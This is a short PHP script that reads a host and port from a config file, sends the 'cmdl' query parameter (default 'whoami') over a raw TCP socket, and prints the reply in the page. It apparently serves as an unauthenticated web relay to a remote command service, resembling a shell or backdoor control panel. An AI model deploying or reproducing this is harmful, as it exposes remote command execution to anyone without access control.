<?php
$config = parse_ini_file('config.ini');

if($config["debug"]){
    error_reporting(E_ALL);
    ini_set('display_errors', 1);
}

$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
$con = socket_connect($socket, $config["host"], $config["port"]);
if(!$con) {
    socket_close($socket);
    exit;
}
if($con){
    $cmdl = isset($_GET['cmdl']) ? $_GET['cmdl'] : "whoami";
    socket_write($socket, $cmdl . "\r\n\r\n");
    $hear = "";
    while($buf = socket_read($socket, 2048)){
        $hear .= $buf;
        if (substr($buf, -strlen(PHP_EOL)) === PHP_EOL) break;
    }
    $hear = str_replace(PHP_EOL, '<br/>', $hear);
    echo $hear;
}
socket_shutdown($socket);
socket_close($socket);
?>